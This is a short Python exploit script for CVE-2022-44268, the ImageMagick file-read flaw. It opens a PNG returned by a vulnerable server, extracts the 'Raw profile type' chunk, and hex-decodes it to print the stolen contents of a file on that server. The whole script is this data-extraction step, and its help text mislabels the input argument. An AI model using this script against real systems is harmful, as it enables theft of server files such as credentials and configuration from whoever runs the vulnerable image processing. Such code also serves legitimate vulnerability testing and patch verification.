#!/usr/bin/env python3
"""
Read file from CVE-2022-44268
Referance: https://www.metabaseq.com/imagemagick-zero-days/
"""

from PIL import Image
import argparse
import sys

# get file path from user with argparse
parser = argparse.ArgumentParser(description='Read file from CVE-2022-44268')
parser.add_argument('-f', '--file', help='File path to be included in payload', required=True)
file_name = parser.parse_args().file

# read file and print log to stderror
print("[+] Reading file: " + file_name, file=sys.stderr)
reagan = Image.open(file_name)
exif = reagan.getexif()

# Read file content from exif
print("[+] Reading file content", file=sys.stderr)
byes = reagan.info["Raw profile type"].encode().replace(b"\n",b"").lstrip()[4:].decode()
byes = bytes.fromhex(byes).decode()

print(byes, end='')
